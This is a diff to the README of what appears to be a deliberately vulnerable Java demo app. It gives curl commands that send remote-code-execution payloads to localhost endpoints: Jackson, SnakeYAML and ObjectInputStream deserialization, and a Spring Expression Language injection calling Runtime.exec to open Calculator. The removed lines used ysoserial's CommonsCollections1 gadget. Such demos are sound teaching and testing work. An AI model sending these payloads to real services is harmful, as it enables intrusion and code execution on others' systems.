@@ -1,16 +1,27 @@
 # Remote Code Execution Demo
 
-## How To: Exploit vulnerability to perform RCE 
+## How To: Exploit vulnerabilities to perform RCE (Java 1.8.0_181 required)
 
-1. Download ysoserial.jar
+# Jackson deserialization
+
 ```
-curl -o ysoserial.jar https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT-b7d0f27b46-1/ysoserial-master-SNAPSHOT-b7d0f27b46-1.jar
+curl -X POST http://localhost:8080/vulnerable/deserialize -H "Content-Type: application/json" --data-binary @jackson.json
 ```
-2. Generate malicious payload
+
+# Spring Expression Language
+
 ```
-java -jar --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED ysoserial.jar CommonsCollections1 "open -a Calculator" > payload.bin
+curl -X POST http://localhost:8080/vulnerable/expression -H "Content-Type: text/plain" -d "T(java.lang.Runtime).getRuntime().exec('open -a Calculator')"
 ```
-3. Send the payload to the vulnerable endpoint
+
+# SnakeYAML
+
 ```
-curl -X POST http://localhost:8080/vulnerable --data-binary @payload.bin -H 'Content-Type: application/octet-stream'
+curl -X POST http://localhost:8080/vulnerable/yaml -H "Content-Type: text/plain" --data-binary @snake-yaml.yaml
+```
+
+# ObjectInputStream exploit
+
+```
+curl -X POST http://localhost:8080/vulnerable/ois --data-binary @ois.bin -H "Content-Type: application/octet-stream"
 ```
